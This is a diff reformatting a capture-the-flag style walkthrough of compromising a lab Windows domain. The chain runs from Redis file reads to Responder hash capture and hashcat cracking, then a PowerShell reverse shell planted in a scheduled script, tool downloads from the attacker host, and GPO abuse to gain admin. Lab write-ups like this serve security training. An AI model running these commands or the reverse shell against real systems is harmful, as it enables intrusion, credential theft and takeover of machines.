@@ -16,7 +16,8 @@ NMAP
 
 ![image1](../resources/262e102caf594fe5946a4430b188d765.png)
 
-- Run enum4linux
+- Run enum4linux:
+
 ```bash
 enum4linux 10.10.147.23
 
@@ -32,6 +33,7 @@ enum4linux 10.10.147.23
 
 - NMAP was taking too long with -p-
 - Ran rustscan instead which is FAST
+
 ```bash
 rustscan -a 10.10.147.23 --ulimit 5000 -- -A
 
@@ -44,7 +46,8 @@ rustscan -a 10.10.147.23 --ulimit 5000 -- -A
 
 ![image5](../resources/2af25ef9376243cc8ad6d0865266df22.png)
 
-- Connect to Redis server
+- Connect to Redis server:
+
 ```bash
 redis-cli -h 10.10.21.182
 
@@ -56,6 +59,7 @@ redis-cli -h 10.10.21.182
 ```
 
 ![image7](../resources/806ff9145ed5445e96c1031239dd1f53.png)
+
 ```bash
 > config get *
 ```
@@ -85,6 +89,7 @@ ie. EVAL "dofile('C:/Windows/System32/drivers/etc/Hosts')" 0
 ![image11](../resources/eab49a21975c4481971b11ab08c55e7b.png)
 
 - Since the user.txt flag is on the Desktop:
+
 ```bash
 EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
 
@@ -97,11 +102,13 @@ EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
 
 - Since we have access to browse essentially and SMB is open
 - We can set up Responder and catch a NTLM hash:
+
 ```bash
 sudo responder -I tun0
 
 ```
 - On the redis-cli:
+
 ```bash
 EVAL "dofile('//10.8.24.66/dsfsdf')" 0  #IP of my Kali tun0
 ```
@@ -114,6 +121,7 @@ EVAL "dofile('//10.8.24.66/dsfsdf')" 0  #IP of my Kali tun0
 - Copy entire hash string (from enterprise-security to the end) put into hashes.txt
 
 - Crack with hashcat:
+
 ```bash
 hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
@@ -131,6 +139,7 @@ hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 - Tried evil-winrm, all impacket modules ie. psexec, etc - Didn't work
 
 - Run enum4linux with the credentials:
+
 ```bash
 enum4linux -u enterprise-security -p sand_0873959498 -a 10.10.57.63
 
@@ -169,6 +178,7 @@ enum4linux -u enterprise-security -p sand_0873959498 -a 10.10.57.63
 **Guest**
 
 - Connect to share:
+
 ```bash
 smbclient //10.10.57.63/Enterprise-Share -U vulnnet/enterprise-security%sand_0873959498
 
@@ -181,11 +191,13 @@ smbclient //10.10.57.63/Enterprise-Share -U vulnnet/enterprise-security%sand_087
 ![image23](../resources/b1211cad775b44b584475d40a25068b4.png)
 
 - Get the script onto Kali with:  
+
 ```bash
 get PurgeIrrelevantData_1826.ps1
 
 ```
 - Edit it with the following:
+
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("10.8.24.66",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
 
@@ -209,6 +221,7 @@ put PurgeIrrelevantData_1826.ps1
 ![image26](../resources/7b17d79f551645b894ef2d06a63dafe4.png)
 
 - Upload Files (PowerView):
+
 ```bash
 (New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/PowerView.ps1', 'C:\Users\enterprise-security\Downloads\PowerView.ps1')
 (New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/Rubeus.exe', 'C:\Users\enterprise-security\Downloads\Rubeus.exe')
@@ -217,7 +230,8 @@ put PurgeIrrelevantData_1826.ps1
 (New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/SharpGPOAbuse.exe', 'C:\Users\enterprise-security\Downloads\SharpGPOAbuse.exe')
 
 ```
-- Run with 
+- Run with:
+
 ```powershell
 . .\PowerView.ps1
 Get-NetDomainController
@@ -234,14 +248,15 @@ Get-NetDomainController
 
 - Set up neo4j and bloodhound on Kali
 
-- Run sharphound
+- Run sharphound:
+
 ```bash
 .\SharpHound.exe --CollectionMethods All --Domain vulnnet.local --ZipFileName loot.zip
 
 ```
 or run with:
 
-```bash
+```powershell
 powershell -ep bypass
 
 . .\sharphound.ps1
@@ -250,6 +265,7 @@ Invoke-Bloodhound --CollectionMethods All --Domain vulnnet.local --ZipFileName l
 
 ```
 - Copy loot file to SMB share:
+
 ```bash
 cp 20231019030138_loot.zip C:\Enterprise-Share
 
@@ -288,6 +304,7 @@ cp 20231019030138_loot.zip C:\Enterprise-Share
 ![image36](../resources/e8cdb6fd20bf4a96bc7c2290b0719e6c.png)
 
 - Copy SharpGPOAbuse.exe to the Windows victim machine and run:
+
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
 
@@ -300,6 +317,7 @@ gpupdate /force
 
 ```
 - Check localgroup:
+
 ```bash
 net localgroup administrators
 
@@ -307,7 +325,8 @@ net localgroup administrators
 
 ![image38](../resources/cdda20f257454e0cafc8eee8ede93a9e.png)
 
-- Now that we have admin privileges - Connect to the C\$ share
+- Now that we have admin privileges - Connect to the C\$ share:
+
 ```bash
 smbclient //10.10.53.145/c$ -U vulnnet/enterprise-security%sand_0873959498
 
